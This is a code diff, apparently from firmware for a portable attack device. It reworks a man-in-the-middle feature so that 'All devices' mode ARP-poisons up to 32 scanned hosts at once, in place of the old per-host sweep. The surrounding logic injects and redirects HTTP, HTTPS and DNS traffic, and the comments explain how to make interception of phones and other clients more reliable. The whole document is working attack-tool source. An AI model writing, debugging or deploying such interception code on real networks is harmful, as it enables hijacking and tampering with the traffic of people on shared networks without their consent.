@@ -798,6 +798,11 @@ MitmScriptResult mitmPayloadLoadScript(const String &path) {
 // 7. MITM Attack page
 // ===========================================================================
 
+// Upper bound for one "All devices" run. Every pair costs a re-poison pass, so
+// the table is capped well below NETSPOOF_MAX_PAIRS: a home network fits, a
+// crowded one still gets its first 32 hosts instead of a 200-pair load spike.
+#define MITM_ALL_PAIRS_MAX 32
+
 static String mitmScriptPath = "";        // chosen payload file
 static bool mitmAllTargets = true;        // Target mode: every host / one host
 static String mitmTargetIpStr = "";
@@ -1695,66 +1700,52 @@ static String mitmRunCore(const String &path, uint32_t durationMs, bool draw) {
     const bool observeOnly =
         (r.pages + r.redirects + r.dns) == 0 && (r.forward != 0 || r.wantInfo || r.probeCount > 0);
 
-    // Many-target sweep: one ARP pair at a time, round-robin over the scan.
-    // Pairing every host at once (the old "All devices") fills the 200-pair
-    // table and multiplies the re-poison load - on a big network that is what
-    // crashed the board. Every all-device run sweeps now, with or without a
-    // `sweep` line, so the pair table cannot grow with the network; `sweep <ms>`
-    // only changes the dwell. A host is skipped once served and `skip <ip>`
-    // hosts are never paired.
     // The Target row is explicit operator intent and wins over the payload's
     // `target` line. rickrollv2.mitm says `target all`, and honouring that while
     // a single host was picked is exactly the bug where one target turned into
     // the whole network. A payload `target` is only a default for the "All
     // devices" mode (where an IP there narrows the run to that host).
     String targetOverride = mitmAllTargets ? r.target : String();
-    const bool sweepAll = mitmAllTargets && (targetOverride.length() == 0 || targetOverride == "all");
-    const uint32_t sweepDwellMs = r.sweep ? r.sweepDwellMs : 1200;
-    int sweepCount = 0, sweepCursor = 0, sweepCurrent = -1, sweepServed = 0;
-    uint32_t sweepLast = 0, sweepHits = 0;
-    bool sweepFinished = false;
-    uint8_t sweepDone[(NETSPOOF_MAX_TARGETS + 7) / 8];
-    memset(sweepDone, 0, sizeof(sweepDone));
-    // Two bits per host: how many idle windows it has already had. A host that
-    // sends not one frame during its window is retired at once (printer, idle
-    // plug, phone asleep); one that talks but never takes a rule is retired
-    // after MITM_SWEEP_IDLE_ROUNDS windows. Re-poisoning silent hosts round
-    // after round only ate the run and looked like "sweeping over hosts that
-    // never redirect".
-    uint8_t sweepIdle[(NETSPOOF_MAX_TARGETS + 3) / 4];
-    memset(sweepIdle, 0, sizeof(sweepIdle));
-    uint32_t sweepFramesAtStart = 0;
 
+    // "All devices" used to sweep one host at a time for 800-1200 ms and retire
+    // a host as "silent" when it did not send a frame inside that window. That
+    // is shorter than the time a freshly poisoned client needs before it talks
+    // through the board, so every real device was retired as silent, the sweep
+    // stopped the last pair and the run sat there with ZERO hosts poisoned -
+    // which is exactly "all devices does not redirect". The scanned hosts are
+    // now poisoned together (capped), so the phone is intercepted from the
+    // first frame instead of racing a dwell timer.
+    const bool pairAll = mitmAllTargets && (targetOverride.length() == 0 || targetOverride == "all");
     int pairs = 0;
-    if (sweepAll) {
+    if (pairAll) {
         String serr;
         int found = netspoof_scan_targets(8000, serr);
-        sweepCount = netspoof_target_count();
-        mitmLogAdd(String("sweep: ") + String(found) + " host(s), one pair at a time");
+        int total = netspoof_target_count();
+        mitmLogAdd(String("all devices: ") + String(found) + " host(s) found");
         if (found <= 0) {
             err = serr.length() ? serr : String("no hosts found");
         } else {
-            for (int k = 0; k < sweepCount; k++) {
-                int i = (sweepCursor + k) % sweepCount;
+            int skipped = 0;
+            for (int i = 0; i < total; i++) {
                 const NetSpoofTarget *t = netspoof_target(i);
-                if (!t || t->gateway || mitmIsSkipped(t->ip)) {
-                    sweepDone[i >> 3] |= (uint8_t)(1u << (i & 7));
+                if (!t || t->gateway || mitmIsSkipped(t->ip)) continue;
+                if (pairs >= MITM_ALL_PAIRS_MAX) {
+                    skipped++;
                     continue;
                 }
                 String e;
                 if (netspoof_arp_start_mac(t->ip, t->mac, IPAddress((uint32_t)0), e)) {
-                    pairs = 1;
-                    sweepCurrent = i;
-                    sweepCursor = (i + 1) % sweepCount;
-                    sweepLast = millis();
-                    sweepFramesAtStart = netspoof_arp_frames();
-                    mitmLogAdd(String("sweep 1/") + String(sweepCount) + ": " + t->ip.toString());
-                    break;
+                    pairs++;
+                } else {
+                    Serial.printf("[MITM] pair %s failed: %s\n", t->ip.toString().c_str(), e.c_str());
                 }
-                Serial.printf("[MITM] sweep pair %s failed: %s\n", t->ip.toString().c_str(), e.c_str());
-                sweepDone[i >> 3] |= (uint8_t)(1u << (i & 7));
             }
-            if (pairs == 0) err = "sweep: no host could be paired";
+            if (pairs == 0)
+                err = "no host could be paired";
+            else if (skipped > 0)
+                mitmLogAdd(String("poisoning ") + String(pairs) + "/" + String(pairs + skipped) + " (cap)");
+            else
+                mitmLogAdd(String("poisoning ") + String(pairs) + " host(s) at once");
         }
     } else {
         pairs = mitmPairTargets(targetOverride, err);
@@ -1858,83 +1849,6 @@ static String mitmRunCore(const String &path, uint32_t durationMs, bool draw) {
         uint32_t hits = netspoof_http_injected() + netspoof_http_redirected() + netspoof_https_injected() +
                         netspoof_https_redirected();
 
-        // Sweep tick: a served host is retired at once; an idle one gets the
-        // dwell window and is retried in the next round (never re-served once
-        // it has hit). Only one pair is ever live, so the pair table cannot
-        // grow with the size of the network.
-        if (sweepAll && !sweepFinished) {
-            bool servedNow = hits > sweepHits;
-            if (servedNow) {
-                sweepHits = hits;
-                if (sweepCurrent >= 0 && sweepCurrent < sweepCount) {
-                    sweepDone[sweepCurrent >> 3] |= (uint8_t)(1u << (sweepCurrent & 7));
-                    sweepServed++;
-                }
-            }
-            // A host that is actively talking gets a few windows before the
-            // sweep rotates away: a browser has to ARP back to the board and
-            // open the page, and rotating out mid-load is what made an
-            // all-device run sweep straight past the phone. Capped, so one busy
-            // host cannot starve the rest of the network, and a quiet host still
-            // gets exactly one window.
-            uint32_t sweepWindows = sweepDwellMs ? ((now - sweepLast) / sweepDwellMs) : 0;
-            bool sweepBusy = netspoof_arp_frames() > sweepFramesAtStart;
-            if (servedNow || sweepWindows >= (sweepBusy ? MITM_SWEEP_WINDOWS : 1)) {
-                // Finish with this host before dropping its pair: served hosts
-                // and silent ones are retired now, busy ones get a few more
-                // windows before the sweep gives up on them.
-                if (!servedNow && sweepCurrent >= 0 && sweepCurrent < sweepCount) {
-                    int done = sweepCurrent;
-                    int shift = (done & 3) * 2;
-                    int rounds = (sweepIdle[done >> 2] >> shift) & 0x3;
-                    bool silent = netspoof_arp_frames() == sweepFramesAtStart;
-                    if (silent) rounds = MITM_SWEEP_IDLE_ROUNDS;
-                    else if (rounds < MITM_SWEEP_IDLE_ROUNDS) rounds++;
-                    sweepIdle[done >> 2] = (uint8_t)(
-                        (sweepIdle[done >> 2] & ~(0x3u << shift)) | ((uint32_t)rounds << shift)
-                    );
-                    if (rounds >= MITM_SWEEP_IDLE_ROUNDS) {
-                        sweepDone[done >> 3] |= (uint8_t)(1u << (done & 7));
-                        const NetSpoofTarget *dt = netspoof_target(done);
-                        if (silent && dt) mitmLogAdd(String("sweep silent: ") + dt->ip.toString());
-                    }
-                }
-                String e;
-                if (netspoof_arp_active()) netspoof_arp_stop(e);
-                sweepCurrent = -1;
-                int next = -1;
-                for (int k = 0; k < sweepCount; k++) {
-                    int i = (sweepCursor + k) % sweepCount;
-                    const NetSpoofTarget *t = netspoof_target(i);
-                    if (!t || t->gateway || mitmIsSkipped(t->ip)) continue;
-                    if (sweepDone[i >> 3] & (uint8_t)(1u << (i & 7))) continue;
-                    next = i;
-                    break;
-                }
-                if (next < 0) {
-                    sweepFinished = true;
-                    mitmLogAdd(
-                        String("sweep done: ") + String(sweepServed) + "/" + String(sweepCount) + " served"
-                    );
-                } else {
-                    const NetSpoofTarget *t = netspoof_target(next);
-                    if (t && netspoof_arp_start_mac(t->ip, t->mac, IPAddress((uint32_t)0), e)) {
-                        sweepCurrent = next;
-                        sweepCursor = (next + 1) % sweepCount;
-                        sweepFramesAtStart = netspoof_arp_frames();
-                        mitmLogAdd(
-                            String("sweep ") + String(sweepServed + 1) + "/" + String(sweepCount) + ": " +
-                            t->ip.toString()
-                        );
-                    } else {
-                        sweepDone[next >> 3] |= (uint8_t)(1u << (next & 7));
-                        mitmLogAdd(String("sweep skip ") + (t ? t->ip.toString() : String("?")));
-                    }
-                }
-                sweepLast = now;
-            }
-        }
-
         // Fallbacks are a timetable: each line fires at its own time from the
         // start, and only while the attack has not produced a single hit, so a
         // fallback can never override a rule that is already working. Several
@@ -1990,9 +1904,7 @@ static String mitmRunCore(const String &path, uint32_t durationMs, bool draw) {
     if (netspoof_arp_active()) netspoof_arp_stop(e3);
 
     mitmClearKeys();
-    String summary = String("pairs ") + String(pairs) +
-                     (sweepAll ? " sweep " + String(sweepServed) + "/" + String(sweepCount) : String()) +
-                     " dns " + String(netspoof_dns_answers()) + "/" +
+    String summary = String("pairs ") + String(pairs) + " dns " + String(netspoof_dns_answers()) + "/" +
                      String(netspoof_dns_queries()) + " http " + String(netspoof_http_injected()) + "/" +
                      String(netspoof_http_requests()) + " https " + String(netspoof_https_injected()) + "/" +
                      String(netspoof_https_requests());
